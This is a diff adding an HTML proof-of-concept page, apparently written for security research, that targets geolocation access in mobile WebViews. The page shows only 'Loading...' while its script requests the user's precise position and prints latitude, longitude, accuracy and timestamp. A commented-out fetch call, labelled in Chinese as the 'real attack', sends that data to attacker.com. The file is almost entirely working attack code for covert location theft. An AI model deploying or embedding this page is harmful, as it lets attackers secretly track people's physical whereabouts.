@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>WebView Geolocation PoC</title>
+</head>
+<body>
+<h1>Loading...</h1>
+
+<script>
+function leak(pos) {
+    const data = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: pos.coords.accuracy,
+        time: pos.timestamp
+    };
+
+    // PoC: 直接打印，真实攻击中可发往远端
+    document.body.innerHTML =
+        "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
+
+    // 真实攻击：
+    // fetch("https://attacker.com/leak", {
+    //   method: "POST",
+    //   body: JSON.stringify(data)
+    // });
+}
+
+function fail(err) {
+    document.body.innerText = "ERROR: " + err.message;
+}
+
+navigator.geolocation.getCurrentPosition(
+    leak,
+    fail,
+    {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+    }
+);
+</script>
+</body>
+</html>
